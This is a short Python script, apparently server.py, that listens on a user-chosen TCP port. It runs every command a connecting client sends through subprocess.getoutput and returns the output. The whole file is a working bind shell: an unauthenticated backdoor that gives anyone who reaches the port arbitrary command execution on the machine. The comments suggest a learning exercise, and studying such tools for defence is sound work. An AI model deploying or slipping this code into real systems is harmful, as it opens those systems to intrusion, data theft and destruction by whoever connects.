import sys
import socket
import subprocess
import signal

def signalHandler(sig, frame):
    print("\nDisconnecting")
    sys.exit(0)

signal.signal(signal.SIGINT, signalHandler) # catches Ctrl+C

if len(sys.argv) != 2:
    print("usage: server.py <port>")
    sys.exit(1)

port = int(sys.argv[1]) # converts string to integer for connection

print("Waiting for connection")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # sets up socket connection

try: # catches connection problems
    server.bind(("", port))
    server.listen(1)
except socket.error:
    print("Could not establish connection")
    sys.exit(1)

while True:
    client, address = server.accept()
    print(f"Connection established from: {address[0]}")

    key = True
    while key != False:
        command = client.recv(4096) # max of 4096 bytes per message
        command = command.decode("utf-8") # decodes bytes + allows to be read in as a string

        if command == "exit": 
            key = False
            client.send(bytes("Goodbye", "utf-8"))
            break
        else:    
            result = subprocess.getoutput(command) # executes command that was recieved + captures the output
            client.send(bytes(result, "utf-8")) # sends client the result of the command

    if key == False:
        print("Disconnecting")
        break

client.close()
server.close()